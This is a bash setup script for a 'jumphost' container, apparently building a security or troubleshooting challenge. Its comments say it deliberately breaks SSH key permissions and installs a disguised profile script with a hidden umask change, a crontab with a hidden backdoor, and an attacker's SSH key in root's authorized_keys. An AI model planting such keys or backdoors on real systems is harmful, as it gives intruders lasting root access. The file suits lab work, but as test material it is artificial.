#!/bin/bash
# Setup script for jumphost (main container)

# Setup SSH directory and keys
mkdir -p /root/.ssh
cp /app/ssh_keys/id_ed25519 /root/.ssh/id_ed25519
cp /app/ssh_keys/id_ed25519.pub /root/.ssh/id_ed25519.pub
cp /app/ssh_config /root/.ssh/config

# Intentionally set wrong permissions (via umask already set by sys-tune.sh)
# The umask 0000 from sys-tune.sh means these files get 0666/0777
# which SSH will reject
chmod 0644 /root/.ssh/id_ed25519

# Install the "performance tuning" script (contains hidden umask change)
cp /app/sys-tune.sh /etc/profile.d/sys-tune.sh

# Install the modified system crontab (contains hidden backdoor)
cp /app/crontab /etc/crontab

# Plant the attacker's key in authorized_keys
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJhY2tkb29yX2tleV9mb3JfYXR0YWNrZXIK attacker@pwned" >> /root/.ssh/authorized_keys

# Start cron daemon
service cron start || cron
